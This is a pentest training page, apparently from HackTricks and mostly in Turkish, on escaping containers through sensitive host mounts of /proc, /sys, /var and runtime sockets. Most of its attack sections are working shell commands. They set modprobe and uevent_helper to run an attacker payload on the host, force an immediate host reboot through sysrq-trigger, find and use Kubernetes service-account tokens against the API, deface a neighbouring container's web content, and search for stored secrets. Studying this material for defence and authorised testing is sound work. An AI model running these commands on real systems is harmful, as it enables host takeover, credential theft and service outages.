# Hassas Host Mount'ları

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Host mount'ları, dikkatle izole edilmiş bir süreç görünümünü sıklıkla host kaynaklarının doğrudan görünürlüğüne geri çevirdikleri için pratikteki en önemli container-escape yüzeylerinden biridir. Tehlikeli vakalar sadece `/` ile sınırlı değildir. `/proc`, `/sys`, `/var` bind mount'ları, runtime socket'leri, kubelet tarafından yönetilen state veya cihazla ilgili yollar kernel kontrollerini, kimlik bilgilerini, komşu container dosya sistemlerini ve runtime yönetim arayüzlerini ortaya çıkarabilir.

Bu sayfa, kötüye kullanım modeli kesişen bir nitelikte olduğu için bireysel koruma sayfalarından ayrı tutulmuştur. Bir yazılabilir host mount kısmen mount namespaces, kısmen user namespaces, kısmen AppArmor veya SELinux kapsamı ve kısmen de hangi kesin host yolunun açığa çıkarıldığı nedeniyle tehlikelidir. Bunu kendi başına bir konu olarak ele almak saldırı yüzeyini anlamayı kolaylaştırır.

## /proc Açığa Çıkması

procfs hem sıradan süreç bilgilerini hem de yüksek etkiye sahip kernel kontrol arayüzlerini içerir. `-v /proc:/host/proc` gibi bir bind mount veya beklenmedik yazılabilir proc girdilerini açığa çıkaran bir container görünümü bilgi sızıntısına, hizmet reddine veya doğrudan host kodu yürütülmesine yol açabilir.

Yüksek değere sahip procfs yolları şunlardır:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Kötüye Kullanım

Başlangıç olarak hangi yüksek değerli procfs girdilerinin görünür veya yazılabilir olduğunu kontrol edin:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

Her yolun pratik değeri farklıdır; hepsinin aynı etkiye sahipmiş gibi davranmak triage'ı zorlaştırır:

- `/proc/sys/kernel/core_pattern`
Yazılabilir ise, kernel çöktüğünde bir pipe handler çalıştıracağı için en yüksek etkili procfs yollarından biridir. Overlay'unda depolanmış veya monte edilmiş bir host yolundaki bir payload'a `core_pattern`'i işaret edebilen bir container genellikle host code-execution elde edebilir. Özel bir örnek için [read-only-paths.md](protections/read-only-paths.md)'ye bakın.
- `/proc/sys/kernel/modprobe`
Bu yol, kernel modül yükleme mantığını tetiklemesi gerektiğinde kullandığı userspace helper'ı kontrol eder. Container'dan yazılabilir ve host bağlamında yorumlanırsa, başka bir host code-execution primitive'i haline gelebilir. Helper yolunu tetikleyecek bir yöntemle birleştirildiğinde özellikle ilgi çekicidir.
- `/proc/sys/vm/panic_on_oom`
Genellikle temiz bir escape primitive'i değildir, ama OOM durumlarını kernel panic davranışına çevirerek bellek baskısını host-genelinde bir denial of service'e dönüştürebilir.
- `/proc/sys/fs/binfmt_misc`
Kayıt arayüzü yazılabilir ise, saldırgan seçilen bir magic değer için bir handler kaydedebilir ve eşleşen bir dosya çalıştırıldığında host-context execution elde edebilir.
- `/proc/config.gz`
kernel exploit triage için faydalıdır. Hangi alt sistemlerin, mitigations'ın ve isteğe bağlı kernel özelliklerinin etkin olduğunu host package metadata'ya ihtiyaç duymadan belirlemeye yardımcı olur.
- `/proc/sysrq-trigger`
Çoğunlukla bir denial-of-service yoludur, ancak çok ciddi bir yol. Host'u hemen reboot, panic veya başka şekillerde bozabilir.
- `/proc/kmsg`
Kernel ring buffer mesajlarını açığa çıkarır. Host fingerprinting, crash analysis için yararlı ve bazı ortamlarda kernel exploitation için faydalı bilgilerin leak edilmesine yardımcı olur.
- `/proc/kallsyms`
Okunabilir olduğunda değerlidir çünkü export edilmiş kernel sembol bilgilerini açığa çıkarır ve kernel exploit development sırasında address randomization varsayımlarını çürütmeye yardımcı olabilir.
- `/proc/[pid]/mem`
Doğrudan bir process-memory arabirimidir. Hedef süreç gerekli ptrace-style koşullarıyla ulaşılabilirse, başka bir sürecin belleğini okumaya veya değiştirmeye izin verebilir. Gerçek etkisi kimlik bilgileri, `hidepid`, Yama ve ptrace kısıtlamalarına büyük ölçüde bağlıdır; bu yüzden güçlü ama koşullu bir yoldur.
- `/proc/kcore`
Sistem belleğinin core-image-style görünümünü açığa çıkarır. Dosya devasa ve kullanımı hantal olmakla birlikte, anlamlı şekilde okunabiliyorsa kötü şekilde açığa çıkmış bir host memory surface'i gösterir.
- `/proc/kmem` and `/proc/mem`
Tarihte yüksek etkili ham bellek arabirimleri. Birçok modern sistemde devre dışı bırakılmış veya sıkı kısıtlanmıştır; ancak mevcut ve kullanılabiliyorlarsa kritikal bulgu olarak değerlendirilmelidir.
- `/proc/sched_debug`
Leaks scheduling ve task bilgilerini; bu, diğer process görünümleri beklendiğinden daha temiz görünse bile host process kimliklerini açığa çıkarabilir.
- `/proc/[pid]/mountinfo`
Host üzerinde container'ın gerçekte nerede olduğunu, hangi yolların overlay-backed olduğunu ve yazılabilir bir mount'un host içeriğine mi yoksa sadece container katmanına mı karşılık geldiğini yeniden oluşturmak için son derece yararlıdır.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Bu komutlar kullanışlıdır çünkü host üzerinde yürütme gerektiren birçok hile, konteyner içindeki bir yolu host'un gördüğü karşılık gelen yola çevirmeyi gerektirir.

### Tam Örnek: `modprobe` Helper Path Abuse

Eğer `/proc/sys/kernel/modprobe` konteynerden yazılabiliyorsa ve helper path host bağlamında yorumlanıyorsa, bu bir saldırgan kontrollü payload'a yönlendirilebilir:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Tam tetikleyici hedefe ve kernel davranışına bağlıdır; ancak önemli nokta, bir writable helper path'in gelecekteki bir kernel helper invocation'ı attacker-controlled host-path content'e yönlendirebilmesidir.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Hedef immediate escape yerine exploitability assessment ise:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Bu komutlar, faydalı sembol bilgisinin görünür olup olmadığını, son kernel mesajlarının ilginç durumları açığa vurup vurmadığını ve hangi kernel özellikleri veya mitigations derlenmiş durumda olduğunu belirlemeye yardımcı olur. Etkisi genellikle doğrudan escape sağlamaz, ancak kernel-vulnerability triyajını keskin şekilde kısaltabilir.

### Tam Örnek: SysRq Host Reboot

Eğer `/proc/sysrq-trigger` yazılabiliyorsa ve host görünümüne ulaşabiliyorsa:
```bash
echo b > /proc/sysrq-trigger
```
Etkisi hemen sunucunun yeniden başlatılmasıdır. Bu ince bir örnek değil, ama procfs maruziyetinin bilgi ifşasından çok daha ciddi olabileceğini açıkça gösteriyor.

## `/sys` Maruziyeti

sysfs, çekirdek ve cihaz durumunun büyük miktarını açığa çıkarır. Bazı sysfs yolları esas olarak fingerprinting için kullanışlıdır, diğerleri ise helper execution'ı, cihaz davranışını, security-module yapılandırmasını veya firmware durumunu etkileyebilir.

Yüksek değerli sysfs yolları şunlardır:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Bu yollar farklı nedenlerle önemlidir. `/sys/class/thermal`, termal yönetim davranışını etkileyebilir ve bu nedenle kötü şekilde açığa çıkarılmış ortamlarda sunucu kararlılığını etkileyebilir. `/sys/kernel/vmcoreinfo` crash-dump ve kernel-layout bilgilerini leak edebilir; bu, düşük seviyeli host fingerprinting için yardımcı olur. `/sys/kernel/security`, Linux Security Modules tarafından kullanılan `securityfs` arayüzüdür; burada beklenmedik erişim MAC-related state'i ifşa edebilir veya değiştirebilir. EFI değişken yolları firmware-destekli önyükleme ayarlarını etkileyebilir; bu da onları sıradan konfigürasyon dosyalarından çok daha ciddi hale getirir. `/sys/kernel/debug` altındaki `debugfs` özellikle tehlikelidir çünkü kasıtlı olarak geliştirici odaklı bir arayüzdür ve sertleştirilmiş, üretim odaklı çekirdek API'lerine kıyasla çok daha az güvenlik beklentisi vardır.

Bu yolları incelemek için faydalı komutlar şunlardır:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
- `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
- `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
- `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.

### Tam Örnek: `uevent_helper`

Eğer `/sys/kernel/uevent_helper` yazılabiliyorsa, bir `uevent` tetiklendiğinde kernel saldırgan kontrollü bir yardımcı programı çalıştırabilir:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Bunun çalışmasının nedeni, helper path'in host'un bakış açısından yorumlanmasıdır. Tetiklendiğinde helper, mevcut container içinde değil host bağlamında çalışır.

## `/var` Maruziyeti

Host'un `/var` dizinini bir container'a mount etmek sıklıkla küçümsenir çünkü `/`'i mount etmek kadar dramatik görünmez. Pratikte bu, runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens ve komşu uygulama filesystem'lerine erişmek için yeterli olabilir. Modern node'larda, `/var` genellikle en operasyonel açıdan ilginç container durumunun bulunduğu yerdir.

### Kubernetes Örneği

hostPath: /var olan bir pod genellikle diğer pod'ların projected tokens ve overlay snapshot içeriğini okuyabilir:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Bu komutlar, mount'ın yalnızca önemsiz uygulama verilerini mi yoksa yüksek etkili cluster credentials'ı mı açığa çıkardığını gösterdikleri için faydalıdır. Okunabilir bir service-account token, local code execution'ı hemen Kubernetes API erişimine dönüştürebilir.

Token mevcutsa, token keşfinde durmak yerine nereye erişebildiğini doğrulayın:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Buradaki etki yerel düğüm erişiminden çok daha büyük olabilir. Geniş RBAC yetkilerine sahip bir token monte edilmiş bir `/var` dizinini tüm küme için ele geçirilmiş hale getirebilir.

### Docker ve containerd Örneği

Docker hostlarında ilgili veriler genellikle `/var/lib/docker` altında bulunur; containerd destekli Kubernetes düğümlerinde ise `/var/lib/containerd` veya snapshotter-özgü yollar altında olabilir:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Mount edilmiş `/var`, başka bir workload'un yazılabilir snapshot içeriğini açıyorsa, saldırgan mevcut container yapılandırmasına dokunmadan uygulama dosyalarını değiştirebilir, web içeriği yerleştirebilir veya startup script'lerini değiştirebilir.

Yazılabilir snapshot içeriği bulunduğunda somut istismar fikirleri:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Bu komutlar faydalıdır çünkü bağlanmış `/var`'ın üç ana etki ailesini gösterir: application tampering, secret recovery ve lateral movement into neighboring workloads.

## Çalışma Zamanı Soketleri

Duyarlı host mount'ları genellikle tam dizinler yerine çalışma zamanı soketlerini içerir. Bunlar o kadar önemlidir ki burada açıkça tekrar vurgulanmayı hak ederler:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Bu sockets'lerden biri mounted olduğunda, tam exploitation flows için bkz. [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md).

Hızlı bir ilk etkileşim deseni:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Eğer bunlardan biri başarılı olursa, "mounted socket" ile "start a more privileged sibling container" arasındaki yol genellikle herhangi bir kernel breakout yolundan çok daha kısadır.

## Mount ile İlgili CVE'ler

Host mount'ları ayrıca runtime zafiyetleriyle de kesişir. Önemli yakın dönem örnekleri şunlardır:

- `CVE-2024-21626` `runc`'ta, leaked bir dizin dosya tanımlayıcısının çalışma dizinini host dosya sistemine yerleştirebilmesi.
- `CVE-2024-23651` ve `CVE-2024-23653` BuildKit'te, OverlayFS copy-up yarışlarının derlemeler sırasında host-path yazmalarına yol açabilmesi.
- `CVE-2024-1753` Buildah ve Podman build akışlarında, build sırasında özel hazırlanmış bind mount'ların `/`'i okunur-yazılır hale getirebilmesi.
- `CVE-2024-40635` containerd'de, büyük bir `User` değerinin taşarak UID 0 davranışına sebep olabilmesi.

Bu CVE'ler burada önemlidir çünkü mount işlemenin yalnızca operatör konfigürasyonu meselesi olmadığını gösterir. Runtime'ın kendisi de mount kaynaklı kaçış koşulları yaratabilir.

## Kontroller

En yüksek değerli mount maruziyetlerini hızlıca bulmak için bu komutları kullanın:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Host root, `/proc`, `/sys`, `/var` ve runtime sockets hepsi yüksek öncelikli bulgulardır.
- Yazılabilir proc/sys girdileri genellikle mount'un host-genel kernel kontrollerini açığa çıkardığını, güvenli bir container görünümü sağlamadığını gösterir.
- Mount edilmiş `/var` yolları sadece dosya sistemi incelemesi değil; kimlik bilgileri ve komşu iş yükü incelemesi gerektirir.
{{#include ../../../banners/hacktricks-training.md}}
